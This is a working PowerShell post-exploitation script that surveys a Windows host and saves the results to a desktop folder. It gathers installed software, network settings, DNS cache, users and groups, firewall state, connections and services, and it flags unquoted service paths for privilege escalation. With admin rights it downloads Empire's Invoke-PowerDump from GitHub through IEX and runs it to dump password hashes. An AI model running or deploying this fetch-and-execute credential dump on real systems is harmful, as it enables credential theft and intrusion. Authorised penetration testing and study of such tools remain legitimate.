function Gathering{

#REQUIRES -Version 4.0 

<# 
.SYNOPSIS
    Gathering information from local systems.
.DESCRIPTION
    This script creates a folder called Results on the host desktop where
    runs, then gathers information of applications installed on the host,
    IP settings, routing tables, DNS cache, System users and groups, Current user,
    vulnerable services and, finally, in case of having administration privileges will download the
    Invoke-PowerDump script from its GitHub repository and will run it to do a hash dump.
.NOTES 
    File Name  : Gathering.ps1 
    Author   : J.M.Blitz (jmblitz@hotmail.com) 
    Prerequisite : PowerShell V4. 
    Copyright 2019 - Juan Miranda Blitz 
.LINK 
    Script posted over: 
    https://github.com/JuanMirandaBlitz/Gathering.ps1 
.EXAMPLE 
    Gathering -Privileged yes
.EXAMPLE
    Gathering -Privileged no
#> 

    
    #=============================================#
    #                   PARAMETERS                #
    #=============================================#
    
    <#
    Mandatory parameter Privileged. This parameter indicates if you have permissions
    of Administrator or not.
    #>

    Param(
    [Parameter(Mandatory=$true)]
    [String]$Privileged
    )


    #=============================================#
    #                 ADVICE USAGE                #
    #=============================================#

    <#
    If the Privileged parameter is different from [yes], then the user is warned
    that the hashes can't be dumped.
    #>
  
    if($Privileged -ne "yes"){
        Write-Output "`n[!] ATTENTION => Administrator privileges needed for HASHDUMP "
        Write-Output "`n[!] ATTENTION => For HASHDUMP Usage: Gathering -Privileged Yes"
    }

    #==============================================#
    #                CREATE FOLDER                 #
    #==============================================#

    <#
    It checks if the [Results] folder exists on the desktop, if it exists, it is deleted and
    a new one is created, if it does not exist, it is created directly.
    #>
    
    $userName = $env:USERNAME
    $directory="Resultados"

    $savePath = "C:\Users\"; $savePath+=$userName; $savePath+="\Desktop\"; $savePath+=$directory 
    $exists = Test-Path $savePath
    
    if ($exists -eq $True) {
        Remove-Item -Recurse -Force -ErrorAction SilentlyContinue $savePath
        mkdir $savePath > $null
        Write-Output "`n[*] Folder [$directory] created!"
    }else{
        mkdir $savePath > $null
        Write-Output "`n[*] Folder [$directory] created!"
    }
    
    #=====================================================#
    #            DATE, HOUR AND COMPUTER NAME             #
    #=====================================================#
    
    <#
    Displays the time and day of the script's execution and gathers the name of the computer.
    The results are saved in a file called Intro.txt.
    #>
    
    Write-Output "=============EXECUTION TIME AND COMPUTER NAME==============" > $savePath\Introduction.txt
    $date = Get-Date
    $cname = $env:COMPUTERNAME
    Write-Output "Execution date and hour: $date"  | Out-File -Append -FilePath $savePath\Introduction.txt
    Write-Output "Computer name: $cname" | Out-File -Append -FilePath $savePath\Introduction.txt
    
    
    #=====================================================#
    #                APPLICATIONS LIST                    #
    #=====================================================#
    
    <#
    Gathers information of the applications installed on the local system and stores the  
    results in a file called ApplicationList.txt.
    #>

    Write-Output "=============LIST OF MACHINE APPLICATIONS==============" > $savePath\ApplicationList.txt
    Get-WmiObject -Class Win32_Product -ComputerName . | Select-Object -Property Name, Vendor, Version | Format-Table -AutoSize | Out-File -Append -FilePath $savePath\ApplicationList.txt
    
    
    
    #=======================================================================#
    #         IP CONFIGURATION - ROUTING TABLES - DNS CACHE                 #
    #=======================================================================#

    <#
    Gathers Information of the IP configurations, routing tables and DNS cache on te local system and
    stores the results in a file called IpRoutingDns.txt.
    #>               

    Write-Output "============IP CONFIGURATION==========" > $savePath\IpRoutingDns.txt
    ipconfig /all | Out-File -Append -FilePath $savePath\IpRoutingDns.txt
    Write-Output "" >> $savePath\IpRoutingDns.txt; Write-Output "" >> $savePath\IpRoutingDns.txt
    
    Write-Output "============PRINT ROUTE==========" >> $savePath\IpRoutingDns.txt
    Write-Output "" >> $savePath\IpRoutingDns.txt
    route print | Out-File -Append -FilePath $savePath\IpRoutingDns.txt
    Write-Output "" >> $savePath\IpRoutingDns.txt;Write-Output "" >> $savePath\IpRoutingDns.txt
    
    Write-Output "============DNS CACHE==========" >> $savePath\IpRoutingDns.txt
    Write-Output "" >> $savePath\IpRoutingDns.txt
    ipconfig /displaydns | Out-File -Append -FilePath $savePath\IpRoutingDns.txt
    
    
    #================================================#
    #               USERS AND GROUPS                 #
    #================================================#

    <#
    Gathers information of all users and groups on the local system and stores the results
    in a file called UsersAndGroups.txt
    #>
    
    Write-Output "=============SYSTEM USERS==============" > $savePath\UsersAndGroups.txt
    Write-Output " " >> $savePath\UsersAndGroups.txt
    $numberUsers = (Get-WmiObject -Class Win32_UserAccount | Select-Object Name).count
    Write-Output "Number of users: $($numberUsers)" >> $savePath\UsersAndGroups.txt
    Get-WmiObject Win32_UserAccount | Select-Object -Property Caption, SID, Name | Format-Table -AutoSize | Out-File -Append -FilePath $savePath\UsersAndGroups.txt
    
    Write-Output "=============SYSTEM GROUPS==============" >> $savePath\UsersAndGroups.txt
    Write-Output " " >> $savePath\UsersAndGroups.txt
    $numberGroups = (Get-WmiObject -Class Win32_Group | Select-Object Name).count
    Write-Output "Number of Groups: $($numberGroups)" >> $savePath\UsersAndGroups.txt
    Get-WmiObject Win32_Group | Select-Object -Property Domain, Name, SID | Format-Table -AutoSize | Out-File -Append -FilePath $savePath\UsersAndGroups.txt
    
    
    #================================================#
    #                  CURRENT USER                  #
    #================================================#

    <#
    Gathers information of the current user on the local system and stores the results
    in a file called CurrentUser.txt
    #>
              
    Write-Output "============CURRENT USER==============" > $savePath\CurrentUser.txt
    Write-Output " " >> $savePath\CurrentUser.txt
    Write-Output "The current User is: $($userName)" >> $savePath\CurrentUser.txt
    Get-WmiObject -Class Win32_UserAccount | Where-Object -FilterScript {$_.Name -eq "$userName"} | Out-File -Append -FilePath $savePath\CurrentUser.txt
   
    Write-Output "============CURRENT USER GROUP==============" >> $savePath\CurrentUser.txt
    net user $env:USERNAME | Out-File -Append -FilePath $savePath\CurrentUser.txt
   

    #================================================#
    #                     FIREWALL                   #
    #================================================#

    <#
    Gathers information of the firewall on the local system and stores the results
    in a file called CurrentUser.txt
    #>
             
    Write-Output "============FIREWALL SETTINGS FOR ALL PROFILES==============" > $savePath\Firewall.txt
    netsh advfirewall show allprofile | Out-File -Append -FilePath $savePath\Firewall.txt
    
    
    #================================================#
    #                  TCP CONNECTIONS               #
    #================================================#

    <#
    Gathers information of the established TCP Connections in the moment of the execution
    #>
    Write-Output "============TCP CONNECTIONS==============" > $savePath\TCPConnections.txt
    Get-NetTCPConnection -State Established | Out-File -Append -FilePath $savePath\TCPConnections.txt
   
   
    #==========================================================#
    #               RUNNING SERVICES AND PROCESS               #
    #==========================================================#
    <#
    Gathers information of the running services and processes in the local machine
    #>
    Write-Output "============RUNNING SERVICES==============" > $savePath\ServicesProcesses.txt
    Get-WmiObject -Class win32_Service | Out-File -Append -FilePath $savePath\ServicesProcesses.txt
   
    Write-Output "============RUNNING PROCESS==============" >> $savePath\ServicesProcesses.txt
    Get-Process | Out-File -Append -FilePath $savePath\ServicesProcesses.txt

    #==========================================================#
    #                    VULNERABLE SERVICES                   #
    #==========================================================#

    <#
    Checks if there are possible routes of windows services binaries which are not specified in quotes.
    This presents a problem and it is that if a route is not between quotation marks Windows will execute the 
    first route that is valid until the first space. 
    In other words, by detecting this an attacker can take advantage of this handicap to provoke a privilege escalation
    after the execution of a binary created for the occasion. Finally the results are stored in a file called VulnerableServices.txt.
    #>

    Write-Output "============VULNERABLE SERVICES==============" > $savePath\VulnerableServices.txt
    $services = Get-WmiObject -Class win32_Service
    $cont = 0

function vulnerableServices{
    foreach ($elemento in $services)
    {
        if((!$elemento.PathName.Equals("")) -and (!$elemento.PathName.StartsWith("`"")) -and ($elemento.PathName -ne $null))
        {
            $elem = $elemento.PathName.Split(" ")[0]
            if((!$elem.Contains(":\Windows")))
            {
                $cont++
                Write-Output "`n[*] Vulnerable service number: $cont" >> $savePath\VulnerableServices.txt
                $elemento.PathName | Out-File -Append -FilePath $savePath\VulnerableServices.txt
                $elemento.Name | Out-File -Append -FilePath $savePath\VulnerableServices.txt
            }
        }
    }
}
vulnerableServices 2> $null

    #=============================================================#
    #                      INVOKE-POWERDUMP                       #
    #=============================================================#
    
    <#
    If the Priviledge parameter is equal to [yes], it is verified that you have administrator permissions, if you have these permissions, the Invoke-PowerDump script
    code will be downloaded with the Invoke-Expression cmdlet which executes a specific string, in this case another cmdlet New-Object with which a .NET Framework class
    is created [System.Net.WebClient] and with its DownloadString method the content (string format) of an url is downloaded. Finally execute the script calling the Invoke-PowerDump function.
    In case you don't have administrator permissions, you will be warned that the hashes dumping has not been possible.
    #>


    $priv = $privileged.ToLower()

    if($privileged -eq "yes")
    {
        if(([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
        {
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1') 
        Invoke-PowerDump | Out-File -Append -FilePath $savePath\Hashdump.txt
        }   
        else
        {
        Write-Host ""; Write-Host "" 
        Write-Host "[!] Yo are not ADMIN => Sorry HASHDUMP not done!"
        }
    }


    #================================================#
    #                   FINISHED                     #
    #================================================#

    <#
    Script finalization message.
    #>
   
    Write-Output "`r`n[^] WORK FINISHED!`r`n[^] Check the folder [$directory] in the path [$savePath] "
  
}
